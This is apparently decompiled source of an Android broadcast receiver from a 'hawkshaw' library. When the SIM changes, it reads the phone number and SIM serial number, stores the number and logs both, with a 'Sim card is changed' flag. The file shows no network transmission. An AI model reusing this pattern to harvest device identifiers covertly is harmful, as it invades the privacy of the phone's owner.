package com.hawkshaw.library.receivers;

import E.k;
import Y1.K;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import com.hawkshaw.library.App;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.preferences.Prefs;
import i.C0528x;
import j3.f;

public final class SimStateReceiver extends BroadcastReceiver {
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "SimStateReceiver";

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    private final void checkSimState(Context context) {
        String str;
        TelephonyManager telephonyManager = (TelephonyManager) k.getSystemService(context, TelephonyManager.class);
        String str2 = null;
        Integer valueOf = telephonyManager != null ? Integer.valueOf(telephonyManager.getSimState()) : null;
        if (valueOf != null && valueOf.intValue() == 0) {
            str = "Unknown";
        } else if (valueOf != null && valueOf.intValue() == 1) {
            str = "Absent";
        } else if (valueOf != null && valueOf.intValue() == 8) {
            str = "Card IO Error";
        } else if (valueOf != null && valueOf.intValue() == 9) {
            str = "Restricted";
        } else if (valueOf != null && valueOf.intValue() == 4) {
            str = "Network Locked";
        } else if (valueOf != null && valueOf.intValue() == 6) {
            str = "Not Ready";
        } else if (valueOf != null && valueOf.intValue() == 7) {
            str = "Permanently Disabled";
        } else if (valueOf != null && valueOf.intValue() == 2) {
            str = "Pin Required";
        } else if (valueOf != null && valueOf.intValue() == 3) {
            str = "Puk required";
        } else if (valueOf != null && valueOf.intValue() == 5) {
            String line1Number = ManifestPermissionsKt.hasPermission("android.permission.READ_SMS", "android.permission.READ_PHONE_NUMBERS", "android.permission.READ_PHONE_STATE") ? telephonyManager.getLine1Number() : "<permission_denied>";
            Prefs prefs = Prefs.INSTANCE;
            if (!K.f(line1Number, prefs.getPhoneNumber())) {
                Logger.d$default(Logger.INSTANCE, TAG, "checkSimState: Sim card is changed", false, 4, (Object) null);
                prefs.setPhoneNumber(line1Number);
            }
            try {
                str2 = telephonyManager.getSimSerialNumber();
            } catch (Exception unused) {
            }
            str = C0528x.e("Ready, Number: ", line1Number, ", Serial Number: ", str2);
        } else {
            str = "<unknown>";
        }
        Logger.d$default(Logger.INSTANCE, TAG, C0528x.h("SimState: ", str), false, 4, (Object) null);
    }

    public void onReceive(Context context, Intent intent) {
        if (K.f("android.intent.action.SIM_STATE_CHANGED", intent != null ? intent.getAction() : null)) {
            if (context == null) {
                try {
                    context = App.Companion.getContext();
                } catch (Exception e5) {
                    Logger.e$default(Logger.INSTANCE, TAG, C0528x.h("SimState: ", e5.getMessage()), (Exception) null, false, 12, (Object) null);
                    return;
                }
            }
            checkSimState(context);
        }
    }
}
